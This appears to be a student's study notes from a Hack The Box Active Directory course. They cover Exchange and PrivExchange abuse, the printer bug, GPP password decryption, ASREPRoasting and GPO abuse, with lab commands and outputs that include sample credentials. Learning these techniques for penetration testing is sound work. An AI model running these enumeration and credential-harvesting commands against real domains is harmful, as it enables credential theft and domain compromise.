
## Exchange Related Group Membership

Exchange Members by default has the right to write DACL to the domain object
1. Leveraged to give user DCSync privileges 
2. Maybe has the right to remote access & reset users passwords
3. Often has the access to mailBoxes 
4. Not uncommon for domain admins / sysadmins to be members of this group
5. If exchange server compromised , we may be often have ability to dump plainText credentials or NTLM hashes due to users often logged in Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login .

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug

#### Enumerating for MS-PRN Printer Bug

```powershell-session
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

<mark style="background: #D2B3FFA6;"> __notes__ : Must do <span style="color: green"> Mantis</span>  Box on HTB</mark>

## <span style="color:red">Sniffing LDAP Credentials </span>

-  https://grimhacker.com/2018/03/09/just-a-printer/

## Enumerating DNS Records

#### Using adidnsdump

```shell
Sauuron@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

#### Finding Passwords in the Description Field using Get-Domain User

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

When this flag set means the user doesn't have to follow the password policy, thus the password might be blank or a short weak password

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

#### Decrypting the Password with gpp-decrypt

```shell
Sauuron@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

#### Using CrackMapExec's gpp_autologin Module

```shell
Sauuron@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## ASREPRoasting

<mark style="background: #FF5582A6;">It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.</mark>

<mark style="background: #FF5582A6;">ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required.</mark>

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

**DONT_REQ_PREAUTH**

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

<mark style="background: #FF5582A6;">When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</mark>

#### Hunting for Users with Kerberoast Pre-auth Not Required

```shell
Sauuron@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

## Group Policy Object (GPO) Abuse

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

#### Enumerating GPO Names with PowerView

```powershell
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

#### Converting GPO GUID to Name

```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Take advantage of the GPO misconfigurations [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) 

#### Research 

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

